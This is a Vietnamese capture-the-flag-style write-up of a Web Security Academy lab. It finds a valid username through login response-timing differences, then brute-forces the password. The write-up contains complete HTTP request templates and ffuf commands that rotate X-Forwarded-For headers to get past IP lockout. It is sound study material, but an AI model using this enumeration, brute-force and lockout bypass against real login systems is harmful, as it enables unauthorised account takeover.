![[Pasted image 20261007142023.png]]
-yêu cầu:
1. Dùng **chênh lệch thời gian phản hồi** để tìm ra **username hợp lệ** (username tồn tại → server xử lý lâu hơn).
2. **Brute-force password** của username đó.
3. **Đăng nhập** vào trang tài khoản của user đó.

> [!NOTE]
> -dùng cờ `-ft '<200'` trong ffuf để lọc các request có timedelay lớn
> -lý do delay: username đúng thì server phải hash password rồi mới so sánh -> lâu hơn. Username sai thì return luôn -> nhanh.

### hướng giải
- [ ] xem response xem lúc nhập đúng, nó delay bao nhiêu
	- [ ] <u>username đúng, response chậm</u>. Còn sai, thì response nhanh
		- [ ] => lý do: username mà đúng thì server phải hash password -> thời gian phản hồi lâu
		- [ ] payload enumerate cần phải dài, thì thời gian delay mới rõ ràng
- [ ] custom payload của ffuf dựa trên timedelay
- [ ] tìm được username -> sau đó tìm được password
- [ ] làm sao để biết khi nào bị block khi brute?
	- [ ] bypass bằng thêm header `X-Forwarded-For` đổi IP liên tục

### giải
-bước 1: sau khi quan sát gói tin login này, mình thấy server có cơ chế block IP nếu login sai quá nhiều. Nên mình phải thêm header `X-Forwarded-For: IP` để mỗi request là 1 IP mới.

-payload `login.txt` để username enumeration của mình, lưu ý cần đổi IP để tránh block:
```
POST /login HTTP/2
Host: 0a9c00fc0498158e810e39390062009b.web-security-academy.net
Cookie: session=5zJp81QlSvrL322yQosCmvxj9E1x1b4A
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: IP

username=USER&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
-mình để password là chuỗi `a` dài 100 ký tự. Vì khi username đúng, server sẽ hash cái chuỗi dài này nên delay càng rõ. Còn username sai thì nó return luôn, không hash nên nhanh.

-mình chạy:
```bash
ffuf -request login.txt -request-proto https -w usernames.txt:USER -w numbers.txt:IP -mode pitchfork -ft '<500'
# -ft '<500' nghĩa là chỉ hiện response có time > 500ms
```
-dùng ffuf với cờ `-ft '<500'` để tìm được response đúng có timedelay lớn
![[Pasted image 20261007152407.png]]
-> time delay lớn nhất -> username là `aq` (tùy instance lab, có lúc là `carlos`, có lúc là user random như `aq`).

-bước 2: có username rồi, mình tiếp tục ffuf tìm password, lúc này mình tìm các response `302`:
```bash
ffuf -request login.txt -request-proto https -w wordlist_pass.txt:PASS -w numbers.txt:IP -mode pitchfork -fc 200
```
-với file `login.txt` lúc này là:
```
POST /login HTTP/2
Host: 0a9c00fc0498158e810e39390062009b.web-security-academy.net
Cookie: session=5zJp81QlSvrL322yQosCmvxj9E1x1b4A
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: IP

username=aq&password=PASS
```

![[Pasted image 20261007152611.png]]

-kết quả, mình đăng nhập với user/pass là: `aq` và `charlie`
![[Pasted image 20261007152103.png|505]]

> [!NOTE]
> -vì sao phải dùng `-mode pitchfork`? Vì mình có 2 wordlist: 1 cái USER/PASS, 1 cái IP. Mình muốn dòng 1 của USER đi với dòng 1 của IP, dòng 2 đi với dòng 2... để mỗi request là 1 IP mới, không bị block. Nếu dùng clusterbomb thì nó sẽ phình tổ hợp lên rất nhiều.
